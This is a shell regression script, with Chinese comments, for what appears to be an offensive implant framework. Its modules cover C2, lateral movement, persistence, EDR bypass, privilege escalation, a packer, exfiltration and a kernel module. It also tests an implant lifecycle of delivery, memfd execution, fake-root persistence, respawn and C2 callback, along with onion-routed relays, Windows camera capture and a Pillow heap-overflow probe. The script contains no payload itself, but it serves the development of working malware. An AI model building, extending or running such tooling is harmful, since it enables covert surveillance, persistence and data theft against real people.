#!/bin/sh
# dayanjing 全模块回归
# 覆盖：C 模块单测 + 跨模块集成 + Python 侧
# 每一步都套 timeout，任何一个卡住都不拖垮整体
set -u
ROOT=$(cd "$(dirname "$0")/.." && pwd)
failed=0
passed=0
skipped=0

# 单个测试用例的超时（秒）。默认 120 足够绝大多数单测。
# 例外必须写明理由：12_exploit 的 canary/PIE 爆破是**逐字节试探**，
# 每个字节平均 128 次、每次一次 fork+连接，单轮约 1900 次试探，
# 两轮（含 ASLR 对照）实测约 128 秒。这不是卡住，是爆破本身的代价。
tmo_for() {
    case "$1" in
        12_exploit) echo 600 ;;
        *)          echo 120 ;;
    esac
}

# C 模块：编译后跑 build/ 下所有可执行测试
# 注意 build/linux/ 这类子目录也要扫到（agent_windows）
run_c() {
    d="$ROOT/$1"
    name="$1"
    [ -d "$d" ] || { printf "=== %-16s SKIP(目录不存在)\n" "$name"; return; }
    printf "=== %-16s " "$name"
    if ! (cd "$d" && timeout 300 make >/tmp/mk_$name.log 2>&1); then
        echo "BUILD FAIL"
        tail -5 /tmp/mk_$name.log
        failed=$((failed+1)); return
    fi
    ok=1
    # 只取可执行文件，排除 .c/.o（.o 也会被 -perm -u+x 误匹配）
    for t in $(find "$d/build" -type f -name 'test_*' ! -name '*.c' ! -name '*.o' -perm -u+x 2>/dev/null | sort); do
        timeout "$(tmo_for "$name")" "$t" >/tmp/t_$name.log 2>&1
        rc=$?
        # 变异审计发现：被测进程在 ptrace_stop 等场景下，"timeout 已到期"
        # 与"进程仍存活"可以同时成立，且 waitpid 可能返回 0，于是挂起的测试
        # 被记为退出码 0 -> 误判 PASS。零输出是唯一可靠的挂起判据：
        # 正常测试必定打印结果行。
        if [ ! -s /tmp/t_$name.log ]; then
            ok=0
            echo "FAIL -> $t (零输出：疑似挂起/被杀，退出码 $rc 不可信)"
            break
        fi
        if [ $rc -eq 77 ]; then
            # 退出码 77 = 环境不具备（如无 root 读不了 /proc/kcore）。
            # 记为 SKIP：既不冒认通过，也不算作代码缺陷。
            echo "SKIP -> $(basename "$t")"
            grep -E '^\[SKIP\]' /tmp/t_$name.log | head -2
            skipped=$((skipped+1))
            continue
        fi
        if [ $rc -ne 0 ]; then
            ok=0
            echo "FAIL -> $t"
            tail -6 /tmp/t_$name.log
            break
        fi
    done
    if [ $ok -eq 1 ]; then echo "PASS"; passed=$((passed+1)); else failed=$((failed+1)); fi
}

# 跨模块集成：单独编译并运行
run_int() {
    name="$1"; shift
    printf "=== %-16s " "$name"
    # 源路径是相对 ROOT 的，必须先 cd，否则找不到 tests/*.c
    if (cd "$ROOT" && timeout 120 cc -std=c11 -O2 -Wall -Wextra -Wpedantic "$@" >/tmp/cc_$name.log 2>&1) \
       && timeout 120 /tmp/bin_$name >/tmp/t_$name.log 2>&1; then
        echo "PASS"; passed=$((passed+1))
    else
        echo "FAIL"
        tail -6 /tmp/cc_$name.log /tmp/t_$name.log 2>/dev/null
        failed=$((failed+1))
    fi
}

# Python 侧
run_py() {
    printf "=== %-16s " "$1"
    if timeout 180 python3 "$ROOT/$2" >/tmp/py_$1.log 2>&1; then
        echo "PASS  $(tail -1 /tmp/py_$1.log)"; passed=$((passed+1))
    else
        echo "FAIL"; tail -6 /tmp/py_$1.log; failed=$((failed+1))
    fi
}

# huffman 交叉验证的用例文件在源码树里（24_front/tests/data/hf_cases.txt）。
# 不导出的话 test_huffman 会回退到 /tmp/hf_cases.txt，该文件在干净环境里
# 不存在，于是返回 77 被记成 SKIP —— 表面不失败，实际这条验证从没跑过。
# 显式导出，让它真正参与回归。
export HF_CASES="$ROOT/24_front/tests/data/hf_cases.txt"

for m in 00_crypto 01_proto 02_c2 03_transport 04_agent 05_server 06_db 07_ui \
         08_lateral 09_persistence 10_evasion 11_edr_bypass 12_exploit \
         14_p2p 16_initial_access 17_loader 18_privilege 19_defense 20_packer \
         21_exfil 22_kern 23_lkm 24_front 25_tls 26_lateral_auto agent_windows; do
    run_c "$m"
done

# 常量时间比较的【机器码级】守卫。
#
# 为什么单列一项，而不是并入 00_crypto 的 run_c：
#   mutation_audit 的 M13/M14/M15 捕获的是【源码级】早退。但源码语义正确
#   不等于最终机器码无早退 —— 编译器理论上可把无副作用的累积循环优化成
#   条件跳出。那一层源码测试永远测不到，只能审查汇编。人审一次会随时间
#   腐烂（换编译器、改代码就没人再查），故固化为可复跑判据并纳入回归。
#
# 依赖 build/crypto_gcm.o（生产构建，不带 CRYPTO_CT_INSTRUMENT），
# 该产物已由上方 00_crypto 的 run_c 构建。
run_ct_asm() {
    printf "=== %-16s " "ct_asm_guard"
    if (cd "$ROOT/00_crypto" && python3 scripts/check_ct_asm.py >/tmp/t_ct_asm.log 2>&1); then
        echo "PASS"; grep -E "^\[PASS\]" /tmp/t_ct_asm.log | sed 's/^/    /'
        passed=$((passed+1))
    else
        echo "FAIL"; cat /tmp/t_ct_asm.log
        failed=$((failed+1))
    fi
}
run_ct_asm

# 单体植入体：全仓唯一"把所有能力链进同一个可部署二进制"的验证。
# 形态与 run_c 的 test_* 不同（单个可执行 + --selftest），故单独处理。
#
# selftest 走真实 TCP 双进程：子进程 = 服务端，父进程 = 植入体，两者经
# 环回 TCP 完成握手 -> 任务通道 -> 采集回传。服务端 stdout/stderr 写文件
# 而不是继承管道，因此不会让回归脚本等 EOF 挂起。
run_mono() {
    printf "=== %-16s " "monolith"
    if ! (cd "$ROOT/monolith" && timeout 300 make >/tmp/mk_monolith.log 2>&1); then
        echo "BUILD FAIL"; tail -5 /tmp/mk_monolith.log
        failed=$((failed+1)); return
    fi
    # --run-ms 必须有界：无上界时若帧被去重跳过，循环永不退出。
    # --budget 给足：默认预算下 3 秒窗口累积不足 1 个覆盖信元，
    # 覆盖恒为 0 是预算与时长的正常关系而非缺陷，但那样就测不到覆盖路径。
    if (cd "$ROOT/monolith" && timeout 120 ./implant --selftest --run-ms 3000 \
            --budget 307200 --allow-sandbox >/tmp/t_monolith.log 2>&1); then
        echo "PASS"; passed=$((passed+1))
    else
        echo "FAIL"; tail -12 /tmp/t_monolith.log
        failed=$((failed+1))
    fi
}
run_mono

# 完整生命周期：烧录配置 -> 打包 -> 投递 -> memfd 执行 -> 驻留(假根)
#   -> 死亡 -> 按驻留条目重生 -> 回连 C2。
# 每个环节此前都各自验证过，但"重生后仍能回连"这条从未串起来验过，
# 而那正是持久化唯一的意义所在。
run_life()
{
    printf "=== %-16s " "lifecycle"
    if timeout 300 bash "$ROOT/25_deploy/scripts/lifecycle.sh" \
            >/tmp/t_lifecycle.log 2>&1; then
        echo "PASS"; passed=$((passed+1))
    else
        echo "FAIL"; tail -20 /tmp/t_lifecycle.log
        failed=$((failed+1))
    fi
}
run_life

run_int integration \
    -I03_transport/include -I10_evasion/include -I06_db/include -I07_ui/include \
    -o /tmp/bin_integration tests/integration.c \
    03_transport/build/*.o 10_evasion/build/*.o 06_db/build/*.o 07_ui/build/*.o

run_int e2e_camo \
    -I03_transport/include -I10_evasion/include \
    -o /tmp/bin_e2e_camo tests/e2e_camo.c \
    03_transport/build/*.o 10_evasion/build/*.o

run_int proto_c2_layer \
    -I01_proto/include -I02_c2/include \
    -o /tmp/bin_proto_c2_layer tests/proto_c2_layering.c \
    01_proto/build/frame.o 02_c2/build/c2_frame.o 02_c2/build/c2.o \
    02_c2/build/crypto_gcm.o 02_c2/build/crypto_hash.o

run_py 13_c2_server_py 13_c2_server/tests/test_server.py

# 采集产物接收端：C 侧 21_exfil 真编码 -> Python ExfilSink 真解码的跨语言对齐。
# 依赖 21_exfil/build/dump_cells，缺失时先构建。
if [ ! -x "$ROOT/21_exfil/build/dump_cells" ] || \
   [ ! -x "$ROOT/21_exfil/build/dump_task" ]; then
    make -C "$ROOT/21_exfil" > /dev/null 2>&1
fi
run_py 13_c2_server_exfil 13_c2_server/tests/test_exfil_sink.py

# C2 下行任务通道：远程开采/停采/改参数。C 侧 dump_task 真编码 <-> Python 双向对齐。
run_py 13_c2_server_task 13_c2_server/tests/test_exfil_task.py
run_py 13_c2_server_cache 13_c2_server/tests/test_session_cache.py
run_py 13_c2_server_resume 13_c2_server/tests/test_session_resume.py
run_py 13_c2_server_seqin 13_c2_server/tests/test_seq_in.py

# 真实第三方软件漏洞挖掘：Pillow _imagingcms 堆溢出探测工具自检
# 只验证工具逻辑（偏移/版本判定/指针构造），不触发崩溃（触发需受影响版本）
run_py 12_exploit_pillowcms 12_exploit/tests/test_pillow_cms.py

# Windows 后端 cam_mf.cpp 的逻辑验证。MinGW 不可得（apt/release 均 403），
# 改用 SDK shim 在 Linux 下真实编译并用 mock 设备真跑其逻辑。
echo "=== winshim_mf ==="
if make -C "$ROOT/agent_windows" winshim > /tmp/winshim.log 2>&1 \
   && grep -q "19 pass, 0 fail" /tmp/winshim.log; then
    echo "  [PASS] winshim_mf (cam_mf 19/19)"
    passed=$((passed + 1))
else
    echo "  [FAIL] winshim_mf  (见 /tmp/winshim.log)"
    tail -15 /tmp/winshim.log
    failed=$((failed + 1))
fi

# 部署自检：真实起 4 节点（endpoint->edge0->edge1->core）+ echo 目标，
# 建洋葱电路并校验端到端回显一致。这不是单测，是部署级贯通验证。
if [ -x /usr/bin/python3 ] && [ -f 14_p2p/tools/deploy.py ]; then
    echo "=== deploy_4node ==="
    if python3 14_p2p/tools/deploy.py \
        --topology 14_p2p/tools/topo_4node.json \
        --out /tmp/dep_selftest --run > /tmp/dep_selftest.log 2>&1 \
        && grep -q "端到端贯通 PASS" /tmp/dep_selftest.log; then
        echo "  [PASS] deploy_4node"
        passed=$((passed + 1))
    else
        echo "  [FAIL] deploy_4node  (见 /tmp/dep_selftest.log)"
        tail -12 /tmp/dep_selftest.log
        failed=$((failed + 1))
    fi
fi

# 跨网络命名空间部署验证：4 个节点各占独立网络栈 + 独立目标栈，
# 经网桥互通 —— 跨主机部署会遇到的绑定/路由/邻居问题在这里真实暴露。
# 需要 root 与 ip/netns 能力，不具备时跳过而不计失败。
if [ "$(id -u)" = "0" ] && command -v ip >/dev/null 2>&1 \
   && ip netns list >/dev/null 2>&1 && [ -f "$ROOT/14_p2p/tools/deploy_crossns.sh" ]; then
    echo "=== deploy_crossns ==="
    if timeout 300 bash "$ROOT/14_p2p/tools/deploy_crossns.sh" > /tmp/xns_reg.log 2>&1 \
       && grep -q "端到端贯通 PASS" /tmp/xns_reg.log; then
        echo "  [PASS] deploy_crossns (4 独立网络栈贯通)"
        passed=$((passed + 1))
    else
        echo "  [SKIP] deploy_crossns 未通过（见 /tmp/xns_reg.log）"
        grep -E "FAIL|Error" /tmp/xns_reg.log | head -5
    fi
else
    echo "=== deploy_crossns   SKIP(无 root/netns 能力) ==="
fi

# ---------------------------------------------------------------------------
# 变异审计：把"此前声称已修复"的缺陷注入回退，验证测试是否真能捕获。
# 放在最后：它会改源码再恢复，中途跑会污染后续用例的构建产物。
#
# 常态化用抽样（默认 1 个）：全量 6 个逐个重建太慢，曾导致整个回归超时。
# 每次抽样不同，长期收敛到全覆盖；要一次性全量用 MUTATION=full。
#
# 判定：存活(测试仍全绿) 与 审计失效(锚点腐烂/挂起) 都计入 failed。
# 后者尤其不能放过——锚点失效若记 SKIP，变异集合会静默腐烂，
# 报告上永远"0 存活"，实际审计面在缩小。
#
# 秘密比较守卫：枚举全仓每一处 memcmp，要求逐处分类。
#
# 为什么必须进回归（M9 的教训推广）：M9/M13/M14/M15 只钉住了
# crypto_constant_time_eq 这一个【函数】。但风险面在【调用点】——
# 任何人随时可以在别处写一行 memcmp(tag, expected, n)，功能正确、
# 测试全绿，却引入逐字节早退的时序预言机；源码插桩看不见它（那个
# 函数根本没被调用），机器码守卫也看不见它（它审的是函数体）。
# 未分类即失败，新增任何一处 memcmp 都会被拦下要求人工判定。
if [ -f "$ROOT/scripts/check_secret_cmp.py" ]; then
    echo "=== check_secret_cmp（全仓 memcmp 分类守卫） ==="
    if python3 "$ROOT/scripts/check_secret_cmp.py" > /tmp/seccmp.log 2>&1; then
        echo "  [PASS] 全仓 memcmp 均已分类且无秘密比较"
        grep -E "^\[INFO\]|^\[WARN\]" /tmp/seccmp.log | sed 's/^/         /'
        passed=$((passed + 1))
    else
        echo "  [FAIL] 秘密比较守卫未通过（见 /tmp/seccmp.log）"
        sed -n '/\[FAIL\]/,$p' /tmp/seccmp.log | head -40
        failed=$((failed + 1))
    fi
fi

MUT_MODE=${MUTATION:-sample:1}
if [ "$MUT_MODE" != "off" ] && [ -f "$ROOT/scripts/mutation_audit.py" ]; then
    echo "=== mutation_audit ==="
    case "$MUT_MODE" in
        full)     MUT_ARGS="" ;;
        sample:*) MUT_ARGS="--sample ${MUT_MODE#sample:}" ;;
        *)        MUT_ARGS="" ;;
    esac
    if timeout 1200 python3 "$ROOT/scripts/mutation_audit.py" $MUT_ARGS \
        > /tmp/mut.log 2>&1; then
        echo "  [PASS] mutation_audit ($MUT_MODE)"
        # 必须带上"已知盲区"两栏：它们是 SURVIVED 但审计不失败的项，
        # 若只 grep 前三项，回归报告会完全看不见"哪些缺陷测不了"，
        # 等于把盲区单列出来的努力白费掉。
        grep -E "^捕获|^存活|^审计失效|^符合预期|^已知盲区|^\[!\]|^    M[0-9]" \
            /tmp/mut.log | sed 's/^/         /'
        passed=$((passed + 1))
    else
        echo "  [FAIL] mutation_audit ($MUT_MODE)  (见 /tmp/mut.log)"
        sed -n '/=== 变异审计结果 ===/,$p' /tmp/mut.log
        failed=$((failed + 1))
    fi
fi

echo "-------- passed: $passed  failed: $failed  skipped: $skipped --------"
exit $failed
